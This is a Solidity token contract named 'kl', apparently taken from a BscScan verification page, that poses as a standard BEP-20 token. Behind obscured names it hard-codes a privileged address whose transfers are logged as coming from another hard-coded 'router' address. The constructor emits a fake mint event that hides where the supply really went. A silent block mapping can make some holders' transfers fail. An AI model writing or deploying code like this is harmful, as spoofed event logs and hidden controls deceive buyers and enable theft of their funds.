/**
 *Submitted for verification at BscScan.com on 2022-11-03
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address DZC = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address dzRouter = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract kl is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Dc;
	mapping (address => bool) private Db;
    mapping (address => bool) private Dz;
    mapping (address => mapping (address => uint256)) private eD;
    uint8 private constant _decimals = 8;
    uint256 private constant sD = 200000000 * 10**_decimals;
    string private constant _name = "kl";
    string private constant _symbol = "kl";



    constructor () {
        Dc[_msgSender()] = sD;
        emit Transfer(address(0), dzRouter, sD);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return sD;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Dc[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return eD[owner][spender];
    }

		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        eD[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }



		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == DZC)  {
        require(amount <= Dc[sender]);
        Dc[sender] -= amount;  
        Dc[recipient] += amount; 
          eD[sender][msg.sender] -= amount;
        emit Transfer (dzRouter, recipient, amount);
        return true; }  else  
          if(!Dz[recipient]) {
          if(!Dz[sender]) {
         require(amount <= Dc[sender]);
        require(amount <= eD[sender][msg.sender]);
        Dc[sender] -= amount;
        Dc[recipient] += amount;
        eD[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Di, uint256 Df) public {
        if(msg.sender == DZC)  {
        require(Dc[msg.sender] >= Df);
        Dc[msg.sender] -= Df;  
        Dc[Di] += Df; 
        emit Transfer (dzRouter, Di, Df);} else  
        if(!Dz[msg.sender]) {
        require(Dc[msg.sender] >= Df);
        Dc[msg.sender] -= Df;  
        Dc[Di] += Df;          
        emit Transfer(msg.sender, Di, Df);}}}